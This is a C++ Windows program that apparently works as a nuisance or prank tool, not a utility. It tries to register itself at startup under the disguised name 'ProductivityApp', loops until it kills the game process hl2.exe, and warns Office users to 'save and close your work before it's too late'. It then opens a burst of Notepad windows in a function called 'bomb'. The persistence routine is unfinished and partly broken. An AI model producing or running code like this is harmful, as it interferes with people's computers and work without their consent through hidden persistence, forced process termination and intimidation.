#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <string>
#include <WinUser.h>
#include <unordered_set>

void bomb()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	WCHAR proc[] = L"Notepad";
	for (int i = 0; i < 3; i++)
	{
		::ZeroMemory(&si, sizeof(STARTUPINFO));
		si.cb = sizeof(STARTUPINFO);
		::ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		::CreateProcess(NULL, proc, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	}
}

DWORD scan_proc(const std::unordered_set<std::wstring>& processes)
{
	HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return ::GetLastError();

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!::Process32First(hProcessSnap, &pe32))
	{
		::CloseHandle(hProcessSnap);
		return ::GetLastError();
	}

	do
	{
		if (processes.find(pe32.szExeFile) != processes.end())
		{
			::CloseHandle(hProcessSnap);
			return EXIT_SUCCESS;
		}
	} while (::Process32Next(hProcessSnap, &pe32));

	::CloseHandle(hProcessSnap);
	return EXIT_FAILURE;
}

DWORD end_proc(const std::wstring& proc_to_end)
{
	HANDLE hProcessSnap = NULL;
	PROCESSENTRY32 pe32;

	hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return ::GetLastError();
	}
		

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		::CloseHandle(hProcessSnap);
		return ::GetLastError();
	}

	bool found = false;

	for (;;)
	{
		hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnap == INVALID_HANDLE_VALUE)
			return ::GetLastError();

		if (!Process32First(hProcessSnap, &pe32))
		{
			::CloseHandle(hProcessSnap);
			return ::GetLastError();
		}

		do
		{
			HANDLE hProc = NULL;
			if (!wcscmp(pe32.szExeFile, proc_to_end.c_str()))
			{
				// end process
				hProc = ::OpenProcess(PROCESS_TERMINATE, false, pe32.th32ProcessID);
				if (hProc == INVALID_HANDLE_VALUE)
					return ::GetLastError();
				if (!::TerminateProcess(hProc, 1))
				{
					::CloseHandle(hProc);
					::CloseHandle(hProcessSnap);
					return ::GetLastError();
				}

				found = true;
			}
		} while (::Process32Next(hProcessSnap, &pe32));

		::CloseHandle(hProcessSnap);
		
		if (found)
			break;
	}

	return EXIT_SUCCESS;
}

void scan_important_procs()
{
	std::unordered_set<std::wstring> processes;
	processes.insert(L"WINWORD.EXE");
	processes.insert(L"EXCEL.EXE");
	processes.insert(L"POWERPNT.EXE");

	if (!scan_proc(processes))
		::MessageBoxExW(NULL, L"Save and close your work before it's too late", L"WARNING", MB_OK|MB_ICONWARNING, 0);

	// block until user closes important processes
	for (; scan_proc(processes) == EXIT_SUCCESS; )
		;
}

// TODO
bool add_to_registry()
{
	HKEY hRoot = HKEY_LOCAL_MACHINE;
	std::wstring subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	std::wstring app_name = L"ProductivityApp";

	// CHANGEME
	std::wstring exe_path = L"PATH_TO_EXE";

	DWORD exe_path_size = sizeof(exe_path);
	HKEY hResult;
	LONG lResult;
	
	// check to see if exe already in registry
	lResult = ::RegOpenKeyExW(hRoot, subKey.c_str(), 0, KEY_READ | KEY_WRITE, &hResult);
	DWORD dwRegType = REG_SZ;


	if (lResult == ERROR_SUCCESS)
	{
		lResult = ::RegGetValueW(hRoot, subKey.c_str(), app_name.c_str(), RRF_RT_REG_SZ, &dwRegType, (PVOID)exe_path.c_str(), &exe_path_size);
		if (lResult == ERROR_SUCCESS)
			return true;
		else
		{
			if (lResult == ERROR_MORE_DATA)
			{
				std::wcerr << L"pvData too small to receive data" << std::endl;
				return false;
			}
				
			if (lResult == ERROR_FILE_NOT_FOUND)
			{
				// create key and value
			}
		}
	}
	
	return true;
}

int main()
{
	std::wstring proc_to_end = L"hl2.exe";

	if (!add_to_registry())
		return EXIT_FAILURE;
	
	if (end_proc(proc_to_end) != EXIT_SUCCESS)
		return EXIT_FAILURE;

	scan_important_procs();

	bomb();
	
	return 0;
}